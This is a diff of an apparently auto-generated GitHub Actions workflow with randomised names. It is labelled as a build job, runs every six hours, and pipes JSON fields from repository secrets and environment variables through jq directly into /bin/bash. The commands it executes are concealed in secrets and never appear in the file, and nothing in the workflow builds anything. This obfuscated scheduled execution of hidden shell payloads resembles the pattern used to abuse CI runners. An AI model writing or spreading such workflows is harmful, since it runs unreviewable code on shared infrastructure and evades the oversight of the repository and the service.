@@ -1,26 +1,26 @@
 name: hongtianbo5678
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 1/6 * * *'
-
-jobs:  # 12938
+    - cron: '5 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: hongtianbo5678
         env:
-          ayhkb810: ${{ secrets.ayhkb810 }}
+          n2: ${{ secrets.n2 }}
         run: |
-          echo $ayhkb810 | jq -r .lt6 | /bin/bash
-          echo $plu9 | jq -r .ylvlo96958 | /bin/bash
-          echo $donv138 | jq -r .xeyb23048 | /bin/bash
-          echo $zgc3 | jq -r .bgc13359 | /bin/bash
-          echo $uvnt99618 | jq -r .tgzs476 | /bin/bash
-          echo $rtf054 | jq -r .mfybe930 | /bin/bash
-          echo $tn33737 | jq -r .pg379 | /bin/bash
-          echo $phqx06592 | jq -r .egv99915 | /bin/bash
-          echo $focb6900 | jq -r .grbt124 | /bin/bash
+          echo $n2 | jq -r .mi86 | /bin/bash
+          echo $nhej19457 | jq -r .eb307 | /bin/bash
+          echo $dxaxd17092 | jq -r .c5607 | /bin/bash
+          echo $r203 | jq -r .oxqrx53716 | /bin/bash
+          echo $oscg1536 | jq -r .i137 | /bin/bash
+          echo $pp03200 | jq -r .jb9438 | /bin/bash
+          echo $xdol0 | jq -r .q63570 | /bin/bash
+          echo $c4231 | jq -r .p2 | /bin/bash
+          echo $owloi67 | jq -r .ken017 | /bin/bash
+          echo $ye967 | jq -r .gxjc66122 | /bin/bash
+          echo $nwuk91100 | jq -r .de404 | /bin/bash
 
